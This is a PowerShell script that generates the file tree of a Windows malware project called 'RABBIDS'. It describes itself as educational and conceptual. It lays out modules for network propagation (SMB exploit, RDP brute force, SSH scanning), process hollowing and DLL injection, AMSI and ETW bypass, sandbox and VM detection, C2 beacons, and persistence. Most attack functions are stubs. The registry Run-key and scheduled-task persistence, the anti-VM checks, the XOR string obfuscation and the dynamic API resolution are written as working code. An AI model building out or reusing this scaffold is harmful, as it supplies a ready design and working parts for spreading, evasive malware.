# populate_all.ps1
# Preenche todos os arquivos do projeto RABBIDS com conteúdo técnico (esqueletos)

$root = "Project_Aurora"   # Altere se a raiz tiver outro nome

function Write-FileContent($relativePath, $content) {
    $fullPath = Join-Path $root $relativePath
    $dir = Split-Path $fullPath -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    Set-Content -Path $fullPath -Value $content -Encoding UTF8
}

# ============================================================================
# Arquivos raiz
# ============================================================================
Write-FileContent ".gitignore" @'
# Ignorar arquivos gerados e builds
build/
*.exe
*.obj
*.pdb
*.user
*.suo
*.userprefs
.vs/
'@

Write-FileContent "README.md" @'
# RABBIDS – Agente Autônomo para Windows (Conceito)

**Aviso:** Este projeto é puramente educacional e conceitual. Não implementa funcionalidades maliciosas reais.

Baseado no script Bash termorregulador, esta versão em C para Windows expande o conceito para um agente modular com capacidades de propagação, evasão e controle, conforme descrito na análise técnica.

## Estrutura do Projeto
- `src/`: Código-fonte modular.
- `include/`: Headers públicos.
- `tests/`: Testes unitários e de integração.
- `tools/`: Ferramentas auxiliares (ofuscador, empacotador).
- `docs/`: Documentação técnica.

## Compilação
Use CMake ou Makefile (exemplo incluso).
'@

Write-FileContent "LICENSE" @'
MIT License (apenas para fins educacionais)
'@

Write-FileContent "Makefile" @'
# Makefile simples para Windows (usando MinGW ou MSVC)
CC=gcc
CFLAGS=-Wall -Iinclude
SRC=$(wildcard src/**/*.c src/*.c)
OBJ=$(SRC:.c=.o)
TARGET=rabbids.exe

all: $(TARGET)

$(TARGET): $(OBJ)
	$(CC) -o $@ $^

clean:
	del /Q $(OBJ) $(TARGET)
'@

Write-FileContent "CMakeLists.txt" @'
cmake_minimum_required(VERSION 3.10)
project(RABBIDS C)

set(CMAKE_C_STANDARD 11)

include_directories(include)

file(GLOB_RECURSE SOURCES "src/*.c")
add_executable(rabbids ${SOURCES})
'@

# ============================================================================
# Configuração
# ============================================================================
Write-FileContent "config/build_settings.ini" @'
[build]
mode=release
ofuscation=true
packer=upx
'@

Write-FileContent "config/evasion_rules.json" @'
{
    "sandbox": {
        "check_vm": true,
        "min_cpu_cores": 4,
        "min_disk_gb": 50,
        "min_uptime_min": 10
    },
    "defender": {
        "amsi_bypass": true,
        "etw_patch": true
    }
}
'@

# ============================================================================
# Documentação
# ============================================================================
Write-FileContent "docs/architecture.md" @'
# Arquitetura do RABBIDS

## Visão Geral
Agente modular composto por:
- **Core**: Percepção, inferência, ação, memória.
- **Módulos**: Propagação, camuflagem, controle de recursos, isolamento de rede, comunicação.
- **Evasion**: Técnicas anti-detecção (AMSI, ETW, sandbox, ofuscação).
- **Persistence**: Múltiplos métodos de persistência.
- **Utils**: Funções auxiliares (crypto, logger, config).

## Fluxo Principal
1. Coleta métricas do sistema.
2. Avalia política com base em thresholds e histórico.
3. Executa ações (ajuste de prioridade, controle de processos, etc.).
4. Executa módulos conforme necessidade (propagação, comunicação).
5. Aplica evasão contínua.
'@

Write-FileContent "docs/evasion_techniques.md" @'
# Técnicas de Evasão

## AMSI Bypass
- Patch da função AmsiScanBuffer (escrever retorno 0).
- Injeção em processos sem AMSI.

## ETW Patch
- Patch de EtwEventWrite para silenciar eventos.

## Detecção de Sandbox/VM
- Verificar presença de módulos VBox, VMware.
- Contagem de CPUs, tamanho de disco, uptime.

## Ofuscação
- Strings codificadas em XOR.
- Resolução dinâmica de APIs.
- Criptografia de seções de código.
'@

Write-FileContent "docs/communication_protocol.md" @'
# Protocolo de Comunicação C2

## Beacons
- HTTPS: POST com dados codificados, certificado fixo.
- DNS: Consultas a subdomínios com payload.
- Named pipes: Comunicação entre hosts infectados.

## Formato dos Dados
Criptografia AES-128 com chave embutida (ofuscada).
'@

Write-FileContent "docs/testing_procedure.md" @'
# Procedimentos de Teste

- Testes unitários com mocks das APIs Win32.
- Testes de integração em VM isolada.
- Validação de evasão com Defender real (offline).
'@

# ============================================================================
# Resources
# ============================================================================
Write-FileContent "resources/payloads/placeholder.txt" "Placeholder para payloads."
Write-FileContent "resources/certificates/placeholder.txt" "Placeholder para certificados."

# ============================================================================
# Scripts auxiliares
# ============================================================================
Write-FileContent "resources/scripts/build.bat" "@echo off
echo Compilando...
gcc -Iinclude -o rabbit.exe src/**/*.c
"
Write-FileContent "resources/scripts/clean.bat" "@echo off
del /Q *.exe *.o
"
Write-FileContent "resources/scripts/run_tests.bat" "@echo off
echo Executando testes...
"
Write-FileContent "resources/scripts/deploy.ps1" "# Script de implantação (exemplo)"
# ============================================================================
# src/core
# ============================================================================
Write-FileContent "src/core/perception.c" @'
// perception.c – Coleta de métricas do sistema (CPU, memória, rede)
#include "perception.h"
#include <windows.h>
#include <pdh.h>
#include <stdio.h>

static PDH_HQUERY cpuQuery;
static PDH_HCOUNTER cpuTotal;

void Perception_Init() {
    PdhOpenQuery(NULL, 0, &cpuQuery);
    PdhAddCounter(cpuQuery, "\\Processor(_Total)\\% Processor Time", 0, &cpuTotal);
    PdhCollectQueryData(cpuQuery);
}

double Perception_GetCpuUsage() {
    PDH_FMT_COUNTERVALUE counterVal;
    PdhCollectQueryData(cpuQuery);
    PdhGetFormattedCounterValue(cpuTotal, PDH_FMT_DOUBLE, NULL, &counterVal);
    return counterVal.doubleValue;
}

DWORD Perception_GetMemoryUsage() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    return (DWORD)(100.0 * (1.0 - (double)memInfo.ullAvailPhys / memInfo.ullTotalPhys));
}
'@

Write-FileContent "src/core/perception.h" @'
#ifndef PERCEPTION_H
#define PERCEPTION_H

void Perception_Init();
double Perception_GetCpuUsage();
DWORD Perception_GetMemoryUsage();

#endif
'@

Write-FileContent "src/core/inference.c" @'
// inference.c – Determina política baseada em métricas e histórico
#include "inference.h"
#include "memory.h"
#include <math.h>

static double cpuThresholds[4] = {30.0, 60.0, 85.0, 95.0}; // low, medium, high, panic

PolicyKey Inference_DeterminePolicy() {
    double cpu = Memory_GetMovingAverage();
    if (cpu < cpuThresholds[0]) return POLICY_LOW;
    if (cpu < cpuThresholds[1]) return POLICY_MEDIUM;
    if (cpu < cpuThresholds[2]) return POLICY_HIGH;
    return POLICY_PANIC;
}
'@

Write-FileContent "src/core/inference.h" @'
#ifndef INFERENCE_H
#define INFERENCE_H

typedef enum {
    POLICY_LOW,
    POLICY_MEDIUM,
    POLICY_HIGH,
    POLICY_PANIC
} PolicyKey;

PolicyKey Inference_DeterminePolicy();

#endif
'@

Write-FileContent "src/core/action.c" @'
// action.c – Executa ações conforme política
#include "action.h"
#include <windows.h>
#include <stdio.h>

void Action_ApplyPolicy(PolicyKey policy) {
    switch(policy) {
        case POLICY_LOW:
            // Ações de baixa intervenção
            break;
        case POLICY_MEDIUM:
            // Reduzir prioridade de processos não críticos
            Action_ReduceBackground();
            break;
        case POLICY_HIGH:
            // Forçar economia de energia
            Action_SetPowerScheme(1);
            break;
        case POLICY_PANIC:
            // Matar processos não essenciais
            Action_KillNonEssential();
            break;
    }
}

void Action_ReduceBackground() {
    // Exemplo: reduzir prioridade de processos de usuário
}

void Action_SetPowerScheme(int throttle) {
    // Chamar API de energia
}

void Action_KillNonEssential() {
    // Mata processos que não são do sistema
}
'@

Write-FileContent "src/core/action.h" @'
#ifndef ACTION_H
#define ACTION_H
#include "inference.h"

void Action_ApplyPolicy(PolicyKey policy);
void Action_ReduceBackground();
void Action_SetPowerScheme(int throttle);
void Action_KillNonEssential();

#endif
'@

Write-FileContent "src/core/memory.c" @'
// memory.c – Mantém histórico e média móvel
#include "memory.h"
#include <stdlib.h>

#define HISTORY_SIZE 10

static double history[HISTORY_SIZE];
static int index = 0;
static int count = 0;

void Memory_AddReading(double value) {
    history[index] = value;
    index = (index + 1) % HISTORY_SIZE;
    if (count < HISTORY_SIZE) count++;
}

double Memory_GetMovingAverage() {
    if (count == 0) return 0.0;
    double sum = 0.0;
    for (int i = 0; i < count; i++) {
        sum += history[i];
    }
    return sum / count;
}
'@

Write-FileContent "src/core/memory.h" @'
#ifndef MEMORY_H
#define MEMORY_H

void Memory_AddReading(double value);
double Memory_GetMovingAverage();

#endif
'@

Write-FileContent "src/core/core_main.c" @'
// core_main.c – Loop principal do agente
#include "perception.h"
#include "inference.h"
#include "action.h"
#include "memory.h"
#include <windows.h>

int main() {
    Perception_Init();
    while (1) {
        double cpu = Perception_GetCpuUsage();
        Memory_AddReading(cpu);
        PolicyKey policy = Inference_DeterminePolicy();
        Action_ApplyPolicy(policy);
        Sleep(5000); // intervalo de 5 segundos
    }
    return 0;
}
'@

# ============================================================================
# Módulo propagation
# ============================================================================
Write-FileContent "src/modules/propagation/propagation.c" @'
// propagation.c – Gerencia a propagação para outros hosts
#include "propagation.h"
#include "smb_exploit.h"
#include "rdp_bruteforce.h"
#include "ssh_scanner.h"

void Propagation_ScanAndInfect() {
    // Escaneia rede local
    // Para cada host vulnerável, tenta métodos em ordem
    SMB_TryExploit();
    RDP_BruteForce();
    SSH_Scan();
}
'@

Write-FileContent "src/modules/propagation/propagation.h" @'
#ifndef PROPAGATION_H
#define PROPAGATION_H

void Propagation_ScanAndInfect();

#endif
'@

Write-FileContent "src/modules/propagation/smb_exploit.c" @'
// smb_exploit.c – Tentativa de exploração SMB (EternalBlue simulado)
#include <windows.h>
#include <stdio.h>

void SMB_TryExploit() {
    // Placeholder: enviar pacote malicioso para porta 445
    printf("SMB exploit attempted\n");
}
'@

Write-FileContent "src/modules/propagation/rdp_bruteforce.c" @"
// rdp_bruteforce.c – Ataque de força bruta RDP
#include <windows.h>
#include <stdio.h>

void RDP_BruteForce() {
    // Placeholder: testar combinações de senha
    printf("RDP brute force attempted\n");
}
"@

Write-FileContent "src/modules/propagation/ssh_scanner.c" @'
// ssh_scanner.c – Scanner SSH
#include <stdio.h>

void SSH_Scan() {
    // Placeholder: escanear porta 22
    printf("SSH scan attempted\n");
}
'@

# ============================================================================
# Módulo camouflage
# ============================================================================
Write-FileContent "src/modules/camouflage/camouflage.c" @'
#include "camouflage.h"
#include "process_hollowing.h"
#include "dll_injection.h"
#include "polymorph.h"

void Camouflage_Apply() {
    ProcessHollowing_Run();
    DLLInjection_Inject();
    Polymorph_Obfuscate();
}
'@

Write-FileContent "src/modules/camouflage/camouflage.h" @'
#ifndef CAMOUFLAGE_H
#define CAMOUFLAGE_H

void Camouflage_Apply();

#endif
'@

Write-FileContent "src/modules/camouflage/process_hollowing.c" @'
// process_hollowing.c – Técnica de injeção em processo legítimo
#include <windows.h>
#include <stdio.h>

void ProcessHollowing_Run() {
    // Placeholder: criar processo suspenso, substituir memória
    printf("Process hollowing executed\n");
}
'@

Write-FileContent "src/modules/camouflage/dll_injection.c" @'
// dll_injection.c – Injeção de DLL remota
#include <windows.h>
#include <stdio.h>

void DLLInjection_Inject() {
    // Placeholder: CreateRemoteThread com LoadLibrary
    printf("DLL injection attempted\n");
}
'@

Write-FileContent "src/modules/camouflage/polymorph.c" @'
// polymorph.c – Ofuscação de código em tempo real
#include <stdio.h>

void Polymorph_Obfuscate() {
    // Placeholder: reescrever partes do código
    printf("Polymorphic mutation\n");
}
'@

# ============================================================================
# Módulo resource_control
# ============================================================================
Write-FileContent "src/modules/resource_control/resource_control.c" @'
#include "resource_control.h"
#include "cgroup_sim.h"
#include "priority_stealing.h"
#include "kill_process.h"

void ResourceControl_Throttle() {
    CgroupSim_Limit();
    PriorityStealing_Steal();
    KillProcess_NonEssential();
}
'@

Write-FileContent "src/modules/resource_control/resource_control.h" @'
#ifndef RESOURCE_CONTROL_H
#define RESOURCE_CONTROL_H

void ResourceControl_Throttle();

#endif
'@

Write-FileContent "src/modules/resource_control/cgroup_sim.c" @'
// cgroup_sim.c – Simula cgroups via Job Objects no Windows
#include <windows.h>
#include <stdio.h>

void CgroupSim_Limit() {
    // Placeholder: criar Job Object e limitar CPU
    printf("cgroup simulation\n");
}
'@

Write-FileContent "src/modules/resource_control/priority_stealing.c" @'
// priority_stealing.c – Aumenta prioridade do agente, reduz de outros
#include <windows.h>
#include <stdio.h>

void PriorityStealing_Steal() {
    // Placeholder: SetPriorityClass
    printf("Priority stealing\n");
}
'@

Write-FileContent "src/modules/resource_control/kill_process.c" @'
// kill_process.c – Finaliza processos não essenciais
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

void KillProcess_NonEssential() {
    // Placeholder: enumerar processos e matar seletivamente
    printf("Killing non-essential processes\n");
}
'@

# ============================================================================
# Módulo network_isolation
# ============================================================================
Write-FileContent "src/modules/network_isolation/network_isolation.c" @'
#include "network_isolation.h"
#include "firewall_block.h"
#include "dns_tunneling.h"
#include "p2p_comm.h"

void NetworkIsolation_Apply() {
    FirewallBlock_BlockExternal();
    DNSTunneling_Init();
    P2PComm_ConnectPeers();
}
'@

Write-FileContent "src/modules/network_isolation/network_isolation.h" @'
#ifndef NETWORK_ISOLATION_H
#define NETWORK_ISOLATION_H

void NetworkIsolation_Apply();

#endif
'@

Write-FileContent "src/modules/network_isolation/firewall_block.c" @'
// firewall_block.c – Bloqueia tráfego externo via Windows Firewall
#include <windows.h>
#include <stdio.h>

void FirewallBlock_BlockExternal() {
    // Placeholder: usar netsh advfirewall ou INetFwPolicy2
    printf("Firewall block applied\n");
}
'@

Write-FileContent "src/modules/network_isolation/dns_tunneling.c" @'
// dns_tunneling.c – Comunicação via DNS
#include <stdio.h>

void DNSTunneling_Init() {
    // Placeholder: enviar consultas DNS com dados
    printf("DNS tunneling initialized\n");
}
'@

Write-FileContent "src/modules/network_isolation/p2p_comm.c" @'
// p2p_comm.c – Comunicação peer-to-peer via named pipes ou sockets
#include <stdio.h>

void P2PComm_ConnectPeers() {
    // Placeholder: estabelecer conexões entre hosts infectados
    printf("P2P communication\n");
}
'@

# ============================================================================
# Módulo communication
# ============================================================================
Write-FileContent "src/modules/communication/communication.c" @'
#include "communication.h"
#include "https_beacon.h"
#include "dns_beacon.h"
#include "pipe_comm.h"

void Communication_Beacon() {
    HTTPS_Beacon();
    DNS_Beacon();
    PipeComm_Listen();
}
'@

Write-FileContent "src/modules/communication/communication.h" @'
#ifndef COMMUNICATION_H
#define COMMUNICATION_H

void Communication_Beacon();

#endif
'@

Write-FileContent "src/modules/communication/https_beacon.c" @'
// https_beacon.c – Beacon HTTPS para C2
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

void HTTPS_Beacon() {
    // Placeholder: WinHttpOpen, WinHttpConnect, etc.
    printf("HTTPS beacon\n");
}
'@

Write-FileContent "src/modules/communication/dns_beacon.c" @'
// dns_beacon.c – Beacon DNS
#include <stdio.h>

void DNS_Beacon() {
    // Placeholder: resolver subdomínios codificados
    printf("DNS beacon\n");
}
'@

Write-FileContent "src/modules/communication/pipe_comm.c" @'
// pipe_comm.c – Comunicação via named pipes
#include <windows.h>
#include <stdio.h>

void PipeComm_Listen() {
    // Placeholder: CreateNamedPipe
    printf("Named pipe listening\n");
}
'@

# ============================================================================
# Evasão
# ============================================================================
Write-FileContent "src/evasion/amsi/amsi_bypass.c" @'
// amsi_bypass.c – Bypass do AMSI via patch
#include <windows.h>
#include <stdio.h>

void AMSI_Bypass() {
    // Placeholder: localizar amsi.dll e escrever 'ret' em AmsiScanBuffer
    printf("AMSI bypass attempted\n");
}
'@

Write-FileContent "src/evasion/amsi/amsi_patch.c" @'
// amsi_patch.c – Patch alternativo
#include <windows.h>

void AMSI_Patch() {
    // Similar ao bypass, mas com outra abordagem
}
'@

Write-FileContent "src/evasion/etw/etw_patch.c" @'
// etw_patch.c – Patch do ETW para silenciar eventos
#include <windows.h>

void ETW_Patch() {
    // Placeholder: escrever 'ret' em EtwEventWrite
}
'@

Write-FileContent "src/evasion/etw/etw_hook.c" @'
// etw_hook.c – Hook de funções ETW
#include <windows.h>

void ETW_Hook() {
    // Placeholder: instalar hook via detours
}
'@

Write-FileContent "src/evasion/sandbox/sandbox_detection.c" @'
// sandbox_detection.c – Detecta ambiente de análise
#include <windows.h>
#include <stdio.h>

int Sandbox_Detect() {
    // Verificações simples
    return 0; // 0 = não é sandbox
}
'@

Write-FileContent "src/evasion/sandbox/vm_detection.c" @'
// vm_detection.c – Detecta máquina virtual
#include <windows.h>
#include <stdio.h>

int VM_Detect() {
    // Verificar presença de módulos VM
    if (GetModuleHandleA("vboxguest.dll")) return 1;
    if (GetModuleHandleA("vmhgfs.dll")) return 1;
    return 0;
}
'@

Write-FileContent "src/evasion/sandbox/debugger_check.c" @'
// debugger_check.c – Anti-debug
#include <windows.h>
#include <stdio.h>

int Debugger_Check() {
    return IsDebuggerPresent();
}
'@

Write-FileContent "src/evasion/ofuscation/string_obfuscation.c" @'
// string_obfuscation.c – Ofuscação de strings via XOR
#include <string.h>

void xor_encrypt(char *str, char key) {
    size_t len = strlen(str);
    for (size_t i = 0; i < len; i++)
        str[i] ^= key;
}
'@

Write-FileContent "src/evasion/ofuscation/api_resolver.c" @'
// api_resolver.c – Resolução dinâmica de APIs para evitar imports
#include <windows.h>

FARPROC ResolveAPI(const char *module, const char *func) {
    HMODULE hMod = GetModuleHandleA(module);
    if (!hMod) hMod = LoadLibraryA(module);
    if (!hMod) return NULL;
    return GetProcAddress(hMod, func);
}
'@

Write-FileContent "src/evasion/ofuscation/code_encryption.c" @'
// code_encryption.c – Criptografia de seções de código
#include <windows.h>

void CodeEncrypt() {
    // Placeholder: descriptografar em runtime
}
'@

Write-FileContent "src/evasion/ofuscation/control_flow_flattening.c" @'
// control_flow_flattening.c – Ofuscação de fluxo
#include <stdio.h>

void FlattenedFunction() {
    // Exemplo de ofuscação
}
'@

Write-FileContent "src/evasion/evasion.h" @'
#ifndef EVASION_H
#define EVASION_H

#include "amsi/amsi_bypass.h"
#include "etw/etw_patch.h"
#include "sandbox/sandbox_detection.h"
#include "ofuscation/string_obfuscation.h"

#endif
'@

# ============================================================================
# Persistência
# ============================================================================
Write-FileContent "src/persistence/scheduled_task.c" @'
// scheduled_task.c – Persistência via tarefa agendada
#include <windows.h>
#include <stdio.h>

void Persist_ScheduledTask() {
    // Placeholder: schtasks /create
    system("schtasks /create /tn \"UpdateTask\" /tr \"C:\\path\\to\\agent.exe\" /sc daily /st 09:00 /f");
}
'@

Write-FileContent "src/persistence/service.c" @'
// service.c – Persistência como serviço Windows
#include <windows.h>
#include <stdio.h>

void Persist_Service() {
    // Placeholder: CreateService
}
'@

Write-FileContent "src/persistence/registry_run.c" @'
// registry_run.c – Chave Run no registro
#include <windows.h>
#include <stdio.h>

void Persist_RegistryRun() {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Updater", 0, REG_SZ, (BYTE*)"C:\\agent.exe", 14);
    RegCloseKey(hKey);
}
'@

Write-FileContent "src/persistence/startup_folder.c" @'
// startup_folder.c – Copiar para pasta de inicialização
#include <windows.h>
#include <stdio.h>

void Persist_StartupFolder() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path);
    strcat(path, "\\agent.lnk");
    // Criar atalho (requer IShellLink)
}
'@

Write-FileContent "src/persistence/com_hijack.c" @'
// com_hijack.c – Sequestro de objeto COM
#include <windows.h>
#include <stdio.h>

void Persist_COMHijack() {
    // Placeholder: modificar chave de classe COM
}
'@

Write-FileContent "src/persistence/persistence.h" @'
#ifndef PERSISTENCE_H
#define PERSISTENCE_H

void Persist_InstallAll();

#endif
'@

# ============================================================================
# Utils
# ============================================================================
Write-FileContent "src/utils/crypto/aes.c" @'
// aes.c – Implementação AES simples (placeholder)
#include "crypto.h"

void AES_Encrypt(unsigned char *input, unsigned char *output, unsigned char *key) {
    // Placeholder
}
'@

Write-FileContent "src/utils/crypto/xor.c" @'
// xor.c – Cifra XOR
#include "crypto.h"

void XOR_Encrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++)
        data[i] ^= key;
}
'@

Write-FileContent "src/utils/crypto/crypto.h" @'
#ifndef CRYPTO_H
#define CRYPTO_H

#include <stddef.h>

void AES_Encrypt(unsigned char *input, unsigned char *output, unsigned char *key);
void XOR_Encrypt(unsigned char *data, size_t len, unsigned char key);

#endif
'@

Write-FileContent "src/utils/logger.c" @'
// logger.c – Sistema de log simples
#include "logger.h"
#include <stdio.h>
#include <time.h>

void Log(const char *msg) {
    FILE *f = fopen("rabbids.log", "a");
    if (f) {
        time_t t = time(NULL);
        fprintf(f, "[%s] %s\n", ctime(&t), msg);
        fclose(f);
    }
}
'@

Write-FileContent "src/utils/logger.h" @'
#ifndef LOGGER_H
#define LOGGER_H

void Log(const char *msg);

#endif
'@

Write-FileContent "src/utils/config_parser.c" @'
// config_parser.c – Lê configuração de arquivo JSON
#include "config_parser.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

Config ParseConfig(const char *filename) {
    Config cfg = {0};
    // Placeholder: parse de JSON (usar biblioteca ou manual)
    return cfg;
}
'@

Write-FileContent "src/utils/config_parser.h" @'
#ifndef CONFIG_PARSER_H
#define CONFIG_PARSER_H

typedef struct {
    int sandbox_check;
    int amsi_bypass;
} Config;

Config ParseConfig(const char *filename);

#endif
'@

Write-FileContent "src/utils/winapi_helpers.c" @'
// winapi_helpers.c – Wrappers para funções da API
#include "winapi_helpers.h"
#include <windows.h>

DWORD GetProcessIdByName(const char *name) {
    // Placeholder: enumerar processos e comparar nome
    return 0;
}
'@

Write-FileContent "src/utils/winapi_helpers.h" @'
#ifndef WINAPI_HELPERS_H
#define WINAPI_HELPERS_H

DWORD GetProcessIdByName(const char *name);

#endif
'@

Write-FileContent "src/main.c" @'
// main.c – Ponto de entrada principal
#include "core/core_main.h"

int main() {
    // Iniciar core
    CoreMain_Run();
    return 0;
}
'@

# ============================================================================
# Headers públicos
# ============================================================================
Write-FileContent "include/core.h" @'
#ifndef CORE_H
#define CORE_H
// Core public API
#endif
'@
Write-FileContent "include/modules.h" @'
#ifndef MODULES_H
#define MODULES_H
// Modules public API
#endif
'@
Write-FileContent "include/evasion.h" @'
#ifndef EVASION_H
#define EVASION_H
// Evasion public API
#endif
'@
Write-FileContent "include/persistence.h" @'
#ifndef PERSISTENCE_H
#define PERSISTENCE_H
// Persistence public API
#endif
'@
Write-FileContent "include/utils.h" @'
#ifndef UTILS_H
#define UTILS_H
// Utils public API
#endif
'@

# ============================================================================
# Testes
# ============================================================================
Write-FileContent "tests/unit/test_perception.c" "// Testes para perception"
Write-FileContent "tests/unit/test_inference.c" "// Testes para inference"
Write-FileContent "tests/unit/test_propagation.c" "// Testes para propagation"
Write-FileContent "tests/unit/test_evasion.c" "// Testes para evasion"
Write-FileContent "tests/integration/test_full_chain.c" "// Teste de integração"
Write-FileContent "tests/integration/test_c2_comms.c" "// Teste de comunicação C2"
Write-FileContent "tests/mocks/mock_winapi.c" "// Mocks para APIs do Windows"

# ============================================================================
# Ferramentas
# ============================================================================
Write-FileContent "tools/obfuscator/obfuscate.py" @'
#!/usr/bin/env python3
# Ofuscador de código (placeholder)
print('Obfuscator')
'@
Write-FileContent "tools/obfuscator/config.yaml" "obfuscation_level: high"
Write-FileContent "tools/packer/packer.c" "// Empacotador customizado (placeholder)"
Write-FileContent "tools/packer/Makefile" "all: packer"
Write-FileContent "tools/payload_generator/gen_payload.py" @'
#!/usr/bin/env python3
# Gerador de payload (placeholder)
print('Payload generator')
'@

# ============================================================================
# Third-party
# ============================================================================
Write-FileContent "third_party/README.txt" "Bibliotecas de terceiros (ex: json-c, libcurl) podem ser colocadas aqui."

Write-Host "Todos os arquivos foram preenchidos com sucesso em: $root"
